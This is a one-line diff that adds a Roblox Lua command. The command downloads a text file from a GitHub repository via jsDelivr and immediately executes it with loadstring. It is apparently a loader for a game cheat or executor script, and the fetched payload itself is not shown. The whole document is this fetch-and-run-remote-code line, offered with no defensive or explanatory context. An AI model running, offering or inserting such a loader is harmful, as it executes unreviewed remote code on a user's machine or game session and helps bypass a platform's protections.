@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.jsdelivr.net/gh/Biasaemail/SAMBUNG-KATA@refs/heads/main/AA17.txt"))()
